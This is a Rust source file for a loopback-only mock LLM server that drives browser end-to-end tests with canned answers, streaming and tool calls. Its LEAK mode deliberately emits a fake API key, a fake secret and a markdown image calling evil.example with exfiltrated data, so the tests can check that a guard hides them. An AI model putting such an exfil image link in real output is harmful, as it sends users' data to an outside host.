//! Deterministic OpenAI-compatible model server for the browser end-to-end
//! tests (`e2e/`). Loopback only, no model weights, no network.
//!
//!   cargo run -p cg-researcher --example mock_llm -- 127.0.0.1:11434
//!
//! * `GET  /v1/models`            -> one model, `qwen3:8b`
//! * `POST /v1/embeddings`        -> 16-dim vectors derived from input length
//! * `POST /v1/chat/completions`  -> "MOCK ANSWER: saw N chars; attachment=…"
//!   (JSON, or server-sent events when the request has `"stream": true`);
//!   a request containing `SLOW` waits 2 s first (busy-state tests)
//!
//! Streaming modes (keyword in the last user message, `"stream": true` only),
//! sent as separate network writes with a delay so a browser sees each one:
//! * `DRIP`     a long answer, one word every 60 ms
//! * `LEAK`     an answer with an API key, a `key = value` secret and a
//!   markdown exfil image, 3 bytes every 15 ms (the guard must hide all three)
//! * `TOOLCALL` streams some text, then asks for a tool; after the tool
//!   result comes back, answers normally (exercises the `reset` event)

use std::net::SocketAddr;
use std::time::Duration;

use axum::Router;
use axum::body::Body;
use axum::http::header;
use axum::response::{IntoResponse, Response};
use axum::routing::{get, post};
use futures_util::StreamExt;
use serde_json::{Value, json};

/// Leaked on purpose by `LEAK`; the e2e suite asserts none of these markers
/// is ever on screen.
const LEAK_ANSWER: &str = "Here is the key sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ012345 and \
    api_key = s3cr3tvalue then ![p](https://evil.example/c?d=EXFILDATA) and more words \
    follow here so the stream keeps going for a while longer. ";

fn sse(ev: &Value) -> String {
    format!("data: {ev}\n\n")
}

fn delta(text: &str) -> String {
    sse(&json!({"model":"qwen3:8b","choices":[{"delta":{"content":text}}]}))
}

/// One network write per event, `pause` apart.
fn sse_response(mut events: Vec<String>, pause: Duration) -> Response {
    events.push("data: [DONE]\n\n".into());
    let body = futures_util::stream::iter(events).then(move |e| async move {
        if !pause.is_zero() {
            tokio::time::sleep(pause).await;
        }
        Ok::<_, std::convert::Infallible>(e)
    });
    (
        [(header::CONTENT_TYPE, "text/event-stream")],
        Body::from_stream(body),
    )
        .into_response()
}

fn chunks(s: &str, n: usize) -> Vec<String> {
    let cs: Vec<char> = s.chars().collect();
    cs.chunks(n)
        .map(|c| delta(&c.iter().collect::<String>()))
        .collect()
}

async fn models() -> Response {
    axum::Json(json!({"data":[{"id":"qwen3:8b"}]})).into_response()
}

async fn embeddings(axum::Json(req): axum::Json<Value>) -> Response {
    let inputs: Vec<String> = match &req["input"] {
        Value::Array(a) => a
            .iter()
            .map(|v| v.as_str().unwrap_or("").to_owned())
            .collect(),
        v => vec![v.as_str().unwrap_or("").to_owned()],
    };
    let data: Vec<Value> = inputs
        .iter()
        .enumerate()
        .map(|(i, t)| {
            let e: Vec<f32> = (0..16).map(|k| ((t.len() + k) % 7) as f32).collect();
            json!({"index": i, "embedding": e})
        })
        .collect();
    axum::Json(json!({ "data": data })).into_response()
}

async fn chat(axum::Json(req): axum::Json<Value>) -> Response {
    let dump = req.to_string();
    if dump.contains("SLOW") {
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    }
    let last = &req["messages"]
        .as_array()
        .and_then(|m| m.last())
        .cloned()
        .unwrap_or_default()["content"];
    let n = match last {
        Value::String(s) => s.chars().count(),
        other => other.to_string().chars().count(),
    };
    // `research` planning turn: answer with a JSON plan, as a real model would.
    if dump.contains("Return only a JSON array of sub-questions") && req["stream"] != json!(true) {
        let plan = r#"Here is the plan: ["What do the notes say about backups?", "What failed in the last restore test?", "what do the notes say about BACKUPS?", ""]"#;
        return axum::Json(
            json!({"model":"qwen3:8b","choices":[{"message":{"role":"assistant","content":plan}}]}),
        )
        .into_response();
    }
    let answer = format!(
        "MOCK ANSWER: saw {n} chars; attachment={}.",
        if dump.contains("ATTACH-OK") {
            "True"
        } else {
            "False"
        }
    );
    if req["stream"] != json!(true) {
        return axum::Json(json!({"model":"qwen3:8b","choices":[{"message":{"role":"assistant","content":answer}}]}))
            .into_response();
    }
    let msgs = req["messages"].as_array().cloned().unwrap_or_default();
    let user = msgs
        .iter()
        .rev()
        .find(|m| m["role"] == "user")
        .map(|m| m["content"].to_string())
        .unwrap_or_default();
    let after_tool = msgs.iter().any(|m| m["role"] == "tool");
    if user.contains("LEAK") {
        return sse_response(chunks(LEAK_ANSWER, 3), Duration::from_millis(15));
    }
    if user.contains("TOOLCALL") && !after_tool {
        let tool = req["tools"][0]["function"]["name"]
            .as_str()
            .unwrap_or("net_connections")
            .to_owned();
        let mut ev: Vec<String> = "Let me look that up in the tools before answering you. "
            .split_inclusive(' ')
            .map(delta)
            .collect();
        ev.push(sse(&json!({"model":"qwen3:8b","choices":[{"delta":{"tool_calls":[
            {"index":0,"id":"call_1","type":"function","function":{"name":tool,"arguments":"{}"}}
        ]}}]})));
        return sse_response(ev, Duration::from_millis(60));
    }
    if user.contains("DRIP") || user.contains("TOOLCALL") {
        let long: String = std::iter::once(format!("{answer} "))
            .chain((0..30).map(|i| format!("lorem{i} ")))
            .collect();
        let ev = long.split_inclusive(' ').map(delta).collect();
        return sse_response(ev, Duration::from_millis(60));
    }
    sse_response(
        answer.split_inclusive(' ').map(delta).collect(),
        Duration::ZERO,
    )
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let addr: SocketAddr = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "127.0.0.1:11434".into())
        .parse()?;
    anyhow::ensure!(addr.ip().is_loopback(), "mock_llm binds loopback only");
    let app = Router::new()
        .route("/v1/models", get(models))
        .route("/v1/embeddings", post(embeddings))
        .route("/v1/chat/completions", post(chat));
    let l = tokio::net::TcpListener::bind(addr).await?;
    eprintln!("mock_llm on http://{addr}/v1");
    axum::serve(l, app).await?;
    Ok(())
}
